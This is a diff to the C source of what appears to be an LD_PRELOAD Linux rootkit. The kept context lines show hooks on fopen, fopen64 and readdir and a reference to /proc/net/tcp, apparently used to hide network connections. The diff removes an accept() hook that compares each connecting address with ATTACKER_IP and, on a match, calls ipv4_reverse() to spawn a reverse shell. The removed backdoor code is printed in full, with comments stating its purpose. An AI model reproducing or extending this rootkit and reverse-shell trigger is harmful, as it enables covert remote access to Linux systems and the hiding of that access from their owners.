@@ -23,7 +23,7 @@
 #define IPV4_INFO_FILE "/proc/net/tcp"
 
 // ORIGINAL FUNCTIONS
-int (*orig_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+//int (*orig_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 struct dirent *(*orig_readdir)(DIR *dirp);
@@ -75,58 +75,7 @@ int ipv4_reverse()
     return 0;
 }
 
-// HOOKS
-// accept() HOOKED FUNCTION
-int orig_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
-{
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen64(DEBUG_FILE, "a+");
-        fprintf(debugFile, "accept() intercepted. \n");
-    #endif
 
-    int sockFileDesc;   // accept() return value - socket file descriptor
-    orig_accept = dlsym(RTLD_NEXT, "accept");
-
-    /*
-    strace output of accept():
-    accept(3, {sa_family=AF_INET, sin_port=htons(34310), sin_addr=inet_addr("127.0.0.1")}, [128->16]) = 5
-    GOAL: retrieve connecting IP from sin_addr member in addr struct
-    */
-    struct sockaddr_in *connectionInfo;             // create sockaddr_in struct
-    connectionInfo = (struct sockaddr_in *)addr;    // type cast addr argument to sockaddr_in struct
-    char *connectingIP = inet_ntoa(connectionInfo->sin_addr);   // retrieve connecting IP from sockaddr_in struct
-
-    // if connecting IP in accept() call is the attacker's IP
-    // FIRST CHECK OF THIS ALWAYS FAILS. don't know why ¯\_(ツ)_/¯
-    if (strcmp(connectingIP, ATTACKER_IP) == 0)
-    {
-        #ifdef DEBUG
-            fprintf(debugFile, "IPs match! - moving to send reverse shell \n");
-        #endif
-
-        // send reverse shell
-        ipv4_reverse();
-
-        // complete accept() call
-        sockFileDesc = orig_accept(sockfd, addr, addrlen);
-    }
-    // if connecting IP IS NOT the attacker's IP
-    else
-    {
-        #ifdef DEBUG
-            fprintf(debugFile, "IPs don't match :/ - running original accept() function \n");
-        #endif
-
-        // run original accept() function
-        sockFileDesc = orig_accept(sockfd, addr, addrlen);
-    }
-
-    #ifdef DEBUG
-        fclose(debugFile);
-    #endif
-
-    return sockFileDesc;
-}
 
 // fopen() HOOKED FUNCTION
 FILE *fopen(const char *pathname, const char *mode) 
